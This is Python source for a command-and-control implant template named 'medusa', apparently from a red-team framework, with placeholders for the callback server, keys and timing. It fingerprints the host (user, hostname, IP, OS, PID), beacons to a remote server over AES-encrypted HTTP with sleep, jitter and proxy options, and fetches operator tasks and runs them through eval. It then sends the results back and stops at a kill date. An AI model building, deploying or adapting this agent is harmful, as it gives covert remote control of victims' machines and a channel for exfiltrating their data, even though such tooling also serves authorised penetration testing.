import os, random, sys, json, socket, base64, time, platform
import urllib.request
from datetime import datetime
from pprint import pprint

class medusa:

    # Utilities
    def getOSVersion(self):
        if platform.mac_ver()[0]:
            return "macOS "+platform.mac_ver()[0]
        else:
            return platform.system() + " " + platform.release()

    def getHostname(self):
        return socket.gethostname()

    def getUsername(self):
        return os.getlogin()

    def getDomain(self):
        return socket.getfqdn()

    def getArch(self): 
        is_64bits = sys.maxsize > 2**32
        if is_64bits:
            return "x64"
        else:
            return "x86"

    def getLocalIp(self):
        return socket.gethostbyname(socket.gethostname())

    def getPid(self):
        return os.getpid()

    def formatMessage(self, data):
        return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.postRequest(self.formatMessage(data))))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.getRequest(self.formatMessage(data))))

    def encrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding

        if not self.agent_config["enc_key"]["value"] == "None" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)

            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
            encryptor = cipher.encryptor()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data)
            padded_data += padder.finalize()

            ct = encryptor.update(padded_data) + encryptor.finalize()

            h = hmac.HMAC(key, hashes.SHA256())
            h.update(iv + ct)
            hmac = h.finalize()

            output = iv + ct + hmac
            return output
        else:
            return data

    def decrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding

        if not self.agent_config["enc_key"]["value"] == "None":
            if len(data)>0:
                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36] # uuid prefix
                iv = data[36:52] # trim uuid
                ct = data[52:-32] # ciphertext been uuid+iv and hmac
                received_hmac = data[-32:] #hmac

                h = hmac.HMAC(key, hashes.SHA256())
                h.update(iv + ct)
                hmac = h.finalize()

                if base64.b64encode(hmac) == base64.b64encode(received_hmac):
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                    decryptor = cipher.decryptor()
                    pt = decryptor.update(ct) + decryptor.finalize()
                    unpadder = padding.PKCS7(128).unpadder()
                    decrypted_data = unpadder.update(pt)
                    decrypted_data += unpadder.finalize()
                    return (uuid+decrypted_data).decode()
                else: return ""
            else: return ""
        else:
            return data.decode()


    # Comms
    def postResponses(self):
        responses = []
        for task in self.taskings:
            if task["completed"] == True:
                out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                if task["error"]: out["status"] = "error"
                elif "file_browser" in task["parameters"]: out["file_browser"] = task["file_browser"]
                responses.append(out)

        if (len(responses) > 0):
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
            for resp in response_data["responses"]:
                self.taskings[:] = [t for t in self.taskings if not resp["task_id"] == t["task_id"] and not resp["status"] == "success"]

    def processTaskings(self):
        for task in self.taskings:
            try:
                if task["started"] == False:
                    task["started"] = True
                    function = getattr(self, task["command"], None)
                    if(callable(function)):
                        try:
                            params = json.loads(task["parameters"]) if task["parameters"] else {}
                            params['task_id'] = task["task_id"] 
                            command =  "self." + task["command"] + "(**params)"
                            output = eval(command)
                        except Exception as error:
                            output = str(error)
                            task["error"] = True                        
                        task["result"] = output
                        task["completed"] = True
                    else:
                        task["error"] == task["completed"] == True
                        task["result"] = "Function unavailable."
            except Exception as error:
                task["error"] == task["completed"] == True
                task["result"] = error

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.postMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False
            }
            self.taskings.append(t)

    def checkIn(self):
        data = {
            "action": "checkin",
            "ip": self.getLocalIp(),
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": self.getHostname(),
            "domain:": self.getDomain(),
            "pid": self.getPid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": self.getArch(),
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.postRequest(encoded_data))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else:
            return False

    def getRequest(self, data):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header["name"]] = header["value"]
        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), hdrs)

        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
                
            urllib.request.install_opener(opener)

        try:
            with urllib.request.urlopen(req) as response:
                return base64.b64decode(response.read()).decode()
        except:
            return ""

    def postRequest(self, data):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header["name"]] = header["value"]
        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)

        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
                
            urllib.request.install_opener(opener)

        try:
            with urllib.request.urlopen(req) as response:
                return base64.b64decode(response.read())
        except:
            return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        now = datetime.now()
        
        if now >= kd:
            return True
        else:
            return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.taskings = []
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    self.getTaskings()
                    self.processTaskings()
                    self.postResponses()
                    self.agentSleep()                    

if __name__ == "__main__":
    medusa = medusa()